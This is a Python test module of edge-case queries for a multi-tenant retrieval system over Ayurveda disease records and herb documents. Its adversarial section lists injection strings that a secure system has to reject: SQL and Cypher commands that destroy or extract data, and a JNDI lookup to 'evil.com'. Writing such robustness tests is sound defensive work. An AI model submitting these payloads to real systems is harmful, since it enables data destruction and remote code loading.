"""100-query edge case suite across 13 categories.

Every query is grounded in entities that actually exist in the live tenants —
verified by querying the databases rather than invented — so a failure means the
system did not retrieve something present, not that the question was unanswerable.

Categories exist because they fail differently. A no-answer query passes by
returning *nothing*; a relationship query passes by returning graph edges; an
isolation probe passes by finding nothing across a tenant boundary. Scoring them
all as "did we retrieve something" would mark abstention failures as successes.

Tenants under test:
    ayurveda_v2   200 CSV rows, structured records: diseases, symptoms, herbs
    herbs_docs    MD + TXT + PDF prose: Ashwagandha, Turmeric, Brahmi
"""
from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional


class Category(str, Enum):
    SEMANTIC = "basic_semantic"
    EXACT = "exact_entity"
    SECTION = "section_context"
    RELATIONSHIP = "relationship"
    MULTI_HOP = "multi_hop"
    COMPARISON = "comparison"
    GLOBAL = "global_community"
    STRUCTURED = "structured_data"
    CROSS_DOC = "cross_document"
    AMBIGUOUS = "ambiguous"
    NO_ANSWER = "no_answer"
    ADVERSARIAL = "adversarial"
    ISOLATION = "multi_tenant_isolation"


class PassRule(str, Enum):
    """How a category decides success. They genuinely differ."""

    RETRIEVES_TEXT = "retrieves_text"        # expected substrings appear
    RETRIEVES_GRAPH = "retrieves_graph"      # graph edges returned
    RETRIEVES_ANY = "retrieves_any"          # any non-fallback result
    ABSTAINS = "abstains"                    # must NOT surface the forbidden term
    REJECTS = "rejects"                      # must raise a security error
    ROUTES_TO = "routes_to"                  # must classify to a given intent
    CLARIFIES = "clarifies"                  # must ask for clarification, not guess


@dataclass
class EdgeCaseQuery:
    """One test query with the criteria for judging its answer.

    Ground-truth fields (`relevant_*`) drive the IR metrics. They are optional:
    a query can be scored behaviourally (did it abstain? did it route correctly?)
    without knowing which specific chunks are relevant, and forcing ground truth
    onto abstention and security cases would be meaningless.
    """

    query: str
    category: Category
    tenant: str
    rule: PassRule

    expect_text: List[str] = field(default_factory=list)
    forbid_text: List[str] = field(default_factory=list)
    expect_intent: Optional[str] = None
    min_graph_edges: int = 0
    note: str = ""

    # ------------------------------------------------------------ ground truth
    # Substrings that identify a relevant chunk. Chunk ids are generated at
    # ingestion and change whenever chunking configuration does, so matching on
    # content keeps the ground truth stable across a chunking A/B.
    relevant_chunk_markers: List[str] = field(default_factory=list)
    relevant_entities: List[str] = field(default_factory=list)
    relevant_relationships: List[str] = field(default_factory=list)

    # Behaviour expected when the query is underspecified.
    expects_clarification: bool = False
    conversation_context: List[str] = field(default_factory=list)

    @property
    def is_security(self) -> bool:
        return self.category in (Category.ISOLATION, Category.ADVERSARIAL)

    @property
    def has_ground_truth(self) -> bool:
        return bool(self.relevant_chunk_markers or self.relevant_entities)


AYUR = "ayurveda_v2"
DOCS = "herbs_docs"


# ============================================================ 1. BASIC SEMANTIC (12)
SEMANTIC_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("What are the symptoms of Cough?", Category.SEMANTIC, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["cough"],
                  relevant_chunk_markers=["Disease: Cough"],
                  relevant_entities=["canon_concept_cough"]),
    EdgeCaseQuery("Tell me about Arthritis", Category.SEMANTIC, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["arthritis"],
                  relevant_chunk_markers=["Disease: Arthritis"],
                  relevant_entities=["canon_concept_arthritis"]),
    EdgeCaseQuery("How is Constipation managed?", Category.SEMANTIC, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["constipation"],
                  relevant_chunk_markers=["Disease: Constipation"],
                  relevant_entities=["canon_concept_constipation"]),
    EdgeCaseQuery("What causes Fever?", Category.SEMANTIC, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["fever"],
                  relevant_chunk_markers=["Disease: Fever"],
                  relevant_entities=["canon_concept_fever"]),
    EdgeCaseQuery("Information about Alzheimer's Disease", Category.SEMANTIC, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["alzheimer"],
                  relevant_chunk_markers=["Disease: Alzheimer"],
                  relevant_entities=["canon_concept_alzheimers_disease"]),
    EdgeCaseQuery("What is Arrhythmia?", Category.SEMANTIC, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["arrhythmia"],
                  relevant_chunk_markers=["Disease: Arrhythmia"],
                  relevant_entities=["canon_concept_arrhythmia"]),
    EdgeCaseQuery("Describe Adrenal Insufficiency", Category.SEMANTIC, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["adrenal"],
                  relevant_chunk_markers=["Disease: Adrenal"],
                  relevant_entities=["canon_concept_adrenal_insufficiency"]),
    EdgeCaseQuery("What is Ashwagandha used for?", Category.SEMANTIC, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["ashwagandha"],
                  relevant_chunk_markers=["Ashwagandha"],
                  relevant_entities=["canon_entity_ashwagandha"]),
    EdgeCaseQuery("Tell me about Turmeric", Category.SEMANTIC, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["turmeric"],
                  relevant_chunk_markers=["Turmeric"],
                  relevant_entities=["canon_entity_turmeric"]),
    EdgeCaseQuery("What does Brahmi do?", Category.SEMANTIC, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["brahmi"],
                  relevant_chunk_markers=["Brahmi"],
                  relevant_entities=["canon_entity_brahmi"]),
    EdgeCaseQuery("Explain the role of Ghee in preparation", Category.SEMANTIC, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["ghee"],
                  relevant_chunk_markers=["Ghee"],
                  relevant_entities=["canon_entity_ghee"]),
    EdgeCaseQuery("What is Curcumin?", Category.SEMANTIC, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["curcumin"],
                  relevant_chunk_markers=["Curcumin"],
                  relevant_entities=["canon_entity_curcumin"]),
]

# ============================================================ 2. EXACT ENTITY (8)
EXACT_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("Alkaptonuria", Category.EXACT, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["alkaptonuria"],
                  note="Bare rare-disease name; BM25 should dominate"),
    EdgeCaseQuery("Argininosuccinic Aciduria", Category.EXACT, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["argininosuccinic"]),
    EdgeCaseQuery("Anulom Vilom", Category.EXACT, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["anulom"]),
    EdgeCaseQuery("Paschimottanasana", Category.EXACT, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["paschimottanasana"],
                  note="Long Sanskrit term; lexical exactness matters"),
    EdgeCaseQuery('"Bacopa monnieri"', Category.EXACT, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["bacopa"],
                  note="Quoted binomial; should route lexical"),
    EdgeCaseQuery('"Withania somnifera"', Category.EXACT, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["withania"]),
    EdgeCaseQuery("Vata-Kapha", Category.EXACT, AYUR,
                  PassRule.RETRIEVES_ANY,
                  note="Hyphenated compound must survive tokenization"),
    EdgeCaseQuery("Brahmi", Category.EXACT, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["brahmi"]),
]

# ============================================================ 3. SECTION/CONTEXT (8)
SECTION_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("What does the Preparation section say?", Category.SECTION, DOCS,
                  PassRule.RETRIEVES_ANY, note="Heading-scoped retrieval"),
    EdgeCaseQuery("What are the clinical notes on Brahmi?", Category.SECTION, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["brahmi"]),
    EdgeCaseQuery("What properties does Ashwagandha have?", Category.SECTION, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["ashwagandha"]),
    EdgeCaseQuery("How should Ashwagandha be used?", Category.SECTION, DOCS,
                  PassRule.RETRIEVES_TEXT, expect_text=["ashwagandha"]),
    EdgeCaseQuery("What is the duration of treatment for Cough?", Category.SECTION, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["cough"]),
    EdgeCaseQuery("What dietary habits are recommended for Arthritis?", Category.SECTION, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["arthritis"]),
    EdgeCaseQuery("What is the prognosis for Fever?", Category.SECTION, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["fever"]),
    EdgeCaseQuery("What lifestyle recommendations apply to Constipation?",
                  Category.SECTION, AYUR, PassRule.RETRIEVES_TEXT, expect_text=["constipation"]),
]

# ============================================================ 4. RELATIONSHIP (12)
RELATIONSHIP_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("What is associated with Cough?", Category.RELATIONSHIP, AYUR,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("Which symptoms relate to Arthritis?", Category.RELATIONSHIP, AYUR,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("What conditions have the Vata attribute?", Category.RELATIONSHIP, AYUR,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("What affects Fever?", Category.RELATIONSHIP, AYUR,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("What is connected to Bronchitis?", Category.RELATIONSHIP, AYUR,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("Which conditions involve Poor Sleep?", Category.RELATIONSHIP, AYUR,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("What relates to Alzheimer's Disease?", Category.RELATIONSHIP, AYUR,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("What does Ashwagandha relate to?", Category.RELATIONSHIP, DOCS,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("What is Brahmi connected to?", Category.RELATIONSHIP, DOCS,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("What relationship exists between Ghee and Brahmi?",
                  Category.RELATIONSHIP, DOCS, PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("What is Turmeric associated with?", Category.RELATIONSHIP, DOCS,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("Which dosha does Ashwagandha balance?", Category.RELATIONSHIP, DOCS,
                  PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
]

# ============================================================ 5. MULTI-HOP (10)
MULTI_HOP_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("What else is associated with the conditions that cause Cough?",
                  Category.MULTI_HOP, AYUR, PassRule.RETRIEVES_GRAPH, min_graph_edges=2,
                  note="Cough -> cause -> other conditions"),
    EdgeCaseQuery("What other conditions share attributes with Arthritis?",
                  Category.MULTI_HOP, AYUR, PassRule.RETRIEVES_GRAPH, min_graph_edges=2),
    EdgeCaseQuery("Which conditions affect Vata dosha and what else treats them?",
                  Category.MULTI_HOP, AYUR, PassRule.RETRIEVES_GRAPH, min_graph_edges=2),
    EdgeCaseQuery("What symptoms are shared between Cough and Bronchitis?",
                  Category.MULTI_HOP, AYUR, PassRule.RETRIEVES_GRAPH, min_graph_edges=2),
    EdgeCaseQuery("What other diseases involve Irregular Sleep like Fever does?",
                  Category.MULTI_HOP, AYUR, PassRule.RETRIEVES_GRAPH, min_graph_edges=2),
    EdgeCaseQuery("What is Curcumin derived from and what does that treat?",
                  Category.MULTI_HOP, DOCS, PassRule.RETRIEVES_GRAPH, min_graph_edges=1,
                  note="Curcumin -> Turmeric -> inflammation"),
    EdgeCaseQuery("What else does the herb that Ghee is combined with treat?",
                  Category.MULTI_HOP, DOCS, PassRule.RETRIEVES_GRAPH, min_graph_edges=1,
                  note="Ghee -> Brahmi -> memory"),
    EdgeCaseQuery("Which herbs share a dosha with Ashwagandha?",
                  Category.MULTI_HOP, DOCS, PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("What is Ashwagandha derived from and what else uses it?",
                  Category.MULTI_HOP, DOCS, PassRule.RETRIEVES_GRAPH, min_graph_edges=1),
    EdgeCaseQuery("What conditions besides Cough involve respiratory symptoms?",
                  Category.MULTI_HOP, AYUR, PassRule.RETRIEVES_GRAPH, min_graph_edges=2),
]

# ============================================================ 6. COMPARISON (8)
COMPARISON_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("Compare Cough and Bronchitis", Category.COMPARISON, AYUR,
                  PassRule.RETRIEVES_ANY, note="Two subjects; fusion must cover both"),
    EdgeCaseQuery("How do Arthritis and Constipation differ?", Category.COMPARISON, AYUR,
                  PassRule.RETRIEVES_ANY),
    EdgeCaseQuery("What is common between Fever and Cough?", Category.COMPARISON, AYUR,
                  PassRule.RETRIEVES_ANY),
    EdgeCaseQuery("Compare the treatment duration of Cough and Arthritis",
                  Category.COMPARISON, AYUR, PassRule.RETRIEVES_ANY),
    EdgeCaseQuery("Compare Ashwagandha and Brahmi", Category.COMPARISON, DOCS,
                  PassRule.RETRIEVES_ANY),
    EdgeCaseQuery("How do Turmeric and Ashwagandha differ in use?",
                  Category.COMPARISON, DOCS, PassRule.RETRIEVES_ANY),
    EdgeCaseQuery("Which is better for memory, Brahmi or Ashwagandha?",
                  Category.COMPARISON, DOCS, PassRule.RETRIEVES_TEXT, expect_text=["brahmi"]),
    EdgeCaseQuery("Compare Vata and Pitta dosha conditions", Category.COMPARISON, AYUR,
                  PassRule.RETRIEVES_ANY),
]

# ============================================================ 7. GLOBAL/COMMUNITY (8)
GLOBAL_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("What are the main themes in this knowledge base?",
                  Category.GLOBAL, AYUR, PassRule.ROUTES_TO, expect_intent="global"),
    EdgeCaseQuery("Summarize the common patterns across all diseases",
                  Category.GLOBAL, AYUR, PassRule.ROUTES_TO, expect_intent="global"),
    EdgeCaseQuery("What are the most common symptoms overall?",
                  Category.GLOBAL, AYUR, PassRule.ROUTES_TO, expect_intent="global"),
    EdgeCaseQuery("Give me an overview of the conditions covered",
                  Category.GLOBAL, AYUR, PassRule.ROUTES_TO, expect_intent="global"),
    EdgeCaseQuery("What major topics does this corpus cover?",
                  Category.GLOBAL, DOCS, PassRule.ROUTES_TO, expect_intent="global"),
    EdgeCaseQuery("What are the key themes across these documents?",
                  Category.GLOBAL, DOCS, PassRule.ROUTES_TO, expect_intent="global"),
    EdgeCaseQuery("Summarize what this knowledge base contains",
                  Category.GLOBAL, DOCS, PassRule.ROUTES_TO, expect_intent="global"),
    EdgeCaseQuery("What kinds of treatments are generally described?",
                  Category.GLOBAL, AYUR, PassRule.ROUTES_TO, expect_intent="global"),
]

# ============================================================ 8. STRUCTURED DATA (8)
STRUCTURED_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("What is the symptom severity for Cough?", Category.STRUCTURED, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["cough"],
                  note="Column value retrieval from a record chunk"),
    EdgeCaseQuery("What is the age group affected by Arthritis?",
                  Category.STRUCTURED, AYUR, PassRule.RETRIEVES_TEXT, expect_text=["arthritis"]),
    EdgeCaseQuery("Which season affects Cough?", Category.STRUCTURED, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["cough"]),
    EdgeCaseQuery("What are the risk factors listed for Fever?",
                  Category.STRUCTURED, AYUR, PassRule.RETRIEVES_TEXT, expect_text=["fever"]),
    EdgeCaseQuery("What formulation is given for Cough?", Category.STRUCTURED, AYUR,
                  PassRule.RETRIEVES_TEXT, expect_text=["cough"]),
    EdgeCaseQuery("What is the gender distribution for Alzheimer's Disease?",
                  Category.STRUCTURED, AYUR, PassRule.RETRIEVES_TEXT, expect_text=["alzheimer"]),
    EdgeCaseQuery("What stress levels are recorded for Arrhythmia?",
                  Category.STRUCTURED, AYUR, PassRule.RETRIEVES_TEXT, expect_text=["arrhythmia"]),
    EdgeCaseQuery("Which conditions list Mild to Moderate severity?",
                  Category.STRUCTURED, AYUR, PassRule.RETRIEVES_ANY),
]

# ============================================================ 9. CROSS-DOCUMENT (6)
CROSS_DOC_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("Which herbs appear across multiple documents?",
                  Category.CROSS_DOC, DOCS, PassRule.RETRIEVES_ANY,
                  note="Spans the MD, TXT, and PDF sources"),
    EdgeCaseQuery("What do the documents say about dosha balance?",
                  Category.CROSS_DOC, DOCS, PassRule.RETRIEVES_ANY),
    EdgeCaseQuery("Which herbs are mentioned alongside stress and memory?",
                  Category.CROSS_DOC, DOCS, PassRule.RETRIEVES_ANY),
    EdgeCaseQuery("What conditions appear with both Vata and Kapha?",
                  Category.CROSS_DOC, AYUR, PassRule.RETRIEVES_ANY),
    EdgeCaseQuery("Which diseases share the symptom of nausea?",
                  Category.CROSS_DOC, AYUR, PassRule.RETRIEVES_ANY),
    EdgeCaseQuery("What treatments recur across different conditions?",
                  Category.CROSS_DOC, AYUR, PassRule.RETRIEVES_ANY),
]

# ============================================================ 10. AMBIGUOUS (5)
AMBIGUOUS_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("treatment", Category.AMBIGUOUS, AYUR, PassRule.RETRIEVES_ANY,
                  note="Bare topic word, but broad enough to retrieve usefully"),
    EdgeCaseQuery("it", Category.AMBIGUOUS, AYUR, PassRule.CLARIFIES,
                  expects_clarification=True,
                  note="Pure anaphora with no antecedent; guessing would be wrong"),
    EdgeCaseQuery("what about that", Category.AMBIGUOUS, AYUR, PassRule.CLARIFIES,
                  expects_clarification=True,
                  note="Anaphora, no antecedent in context"),
    EdgeCaseQuery("more", Category.AMBIGUOUS, DOCS, PassRule.CLARIFIES,
                  expects_clarification=True,
                  note="Continuation request with no prior turn to continue"),
    EdgeCaseQuery("more", Category.AMBIGUOUS, DOCS, PassRule.RETRIEVES_TEXT,
                  expect_text=["ashwagandha"],
                  conversation_context=["What is Ashwagandha used for?"],
                  note="Same word WITH context: resolves against the prior turn "
                       "instead of asking. The pair is the point - identical input, "
                       "different correct behaviour."),
    EdgeCaseQuery("herbs", Category.AMBIGUOUS, DOCS, PassRule.CLARIFIES,
                  expects_clarification=True,
                  note="Category word naming no entity; arbitrary retrieval would "
                       "look like an answer while being a guess"),
]

# ============================================================ 11. NO-ANSWER (5)
NO_ANSWER_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("What is the capital of France?", Category.NO_ANSWER, AYUR,
                  PassRule.ABSTAINS, forbid_text=["paris"],
                  note="Out of domain entirely"),
    EdgeCaseQuery("Who won the 2022 World Cup?", Category.NO_ANSWER, AYUR,
                  PassRule.ABSTAINS, forbid_text=["argentina", "world cup"]),
    EdgeCaseQuery("How do I write a Python function?", Category.NO_ANSWER, DOCS,
                  PassRule.ABSTAINS, forbid_text=["def ", "python function"]),
    EdgeCaseQuery("What is the price of Bitcoin?", Category.NO_ANSWER, AYUR,
                  PassRule.ABSTAINS, forbid_text=["bitcoin", "btc"]),
    EdgeCaseQuery("Which film did Christopher Nolan direct?", Category.NO_ANSWER, AYUR,
                  PassRule.ABSTAINS, forbid_text=["nolan", "inception"],
                  note="Belongs to a tenant that no longer exists"),
]

# ============================================================ 12. ADVERSARIAL (5)
ADVERSARIAL_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("Cough'; DROP DATABASE tenant_ayurveda_v2_kb; --",
                  Category.ADVERSARIAL, AYUR, PassRule.REJECTS,
                  note="Statement chaining with database destruction"),
    EdgeCaseQuery("Cough DETACH DELETE n", Category.ADVERSARIAL, AYUR,
                  PassRule.REJECTS, note="Destructive delete verb"),
    EdgeCaseQuery("Cough UNION ALL MATCH (n) RETURN n", Category.ADVERSARIAL, AYUR,
                  PassRule.REJECTS, note="Union-based extraction"),
    EdgeCaseQuery("Cough CALL dbms.components()", Category.ADVERSARIAL, AYUR,
                  PassRule.REJECTS, note="Procedure invocation"),
    EdgeCaseQuery("Cough ${jndi:ldap://evil.com/a}", Category.ADVERSARIAL, AYUR,
                  PassRule.REJECTS, note="Template interpolation"),
]

# ============================================================ 13. ISOLATION (5)
ISOLATION_QUERIES: List[EdgeCaseQuery] = [
    EdgeCaseQuery("Bacopa monnieri", Category.ISOLATION, AYUR,
                  PassRule.ABSTAINS, forbid_text=["bacopa"],
                  note="Exists only in herbs_docs"),
    EdgeCaseQuery("Withania somnifera", Category.ISOLATION, AYUR,
                  PassRule.ABSTAINS, forbid_text=["withania"],
                  note="Exists only in herbs_docs"),
    EdgeCaseQuery("Alkaptonuria", Category.ISOLATION, DOCS,
                  PassRule.ABSTAINS, forbid_text=["alkaptonuria"],
                  note="Exists only in ayurveda_v2"),
    EdgeCaseQuery("Argininosuccinic Aciduria", Category.ISOLATION, DOCS,
                  PassRule.ABSTAINS, forbid_text=["argininosuccinic"],
                  note="Exists only in ayurveda_v2"),
    EdgeCaseQuery("Paschimottanasana Anulom Vilom", Category.ISOLATION, DOCS,
                  PassRule.ABSTAINS, forbid_text=["paschimottanasana", "anulom"],
                  note="Yoga practices exist only in ayurveda_v2"),
]


ALL_QUERIES: List[EdgeCaseQuery] = (
    SEMANTIC_QUERIES + EXACT_QUERIES + SECTION_QUERIES + RELATIONSHIP_QUERIES
    + MULTI_HOP_QUERIES + COMPARISON_QUERIES + GLOBAL_QUERIES + STRUCTURED_QUERIES
    + CROSS_DOC_QUERIES + AMBIGUOUS_QUERIES + NO_ANSWER_QUERIES
    + ADVERSARIAL_QUERIES + ISOLATION_QUERIES
)

CATEGORY_PURPOSE = {
    Category.SEMANTIC: "Vector retrieval",
    Category.EXACT: "BM25 + entity resolution",
    Category.SECTION: "Chunking quality",
    Category.RELATIONSHIP: "Graph retrieval",
    Category.MULTI_HOP: "Graph traversal",
    Category.COMPARISON: "Multi-source retrieval + fusion",
    Category.GLOBAL: "Community search",
    Category.STRUCTURED: "CSV/JSON/XLSX retrieval",
    Category.CROSS_DOC: "Multi-document retrieval",
    Category.AMBIGUOUS: "Query understanding",
    Category.NO_ANSWER: "Abstention",
    Category.ADVERSARIAL: "Robustness",
    Category.ISOLATION: "Security",
}
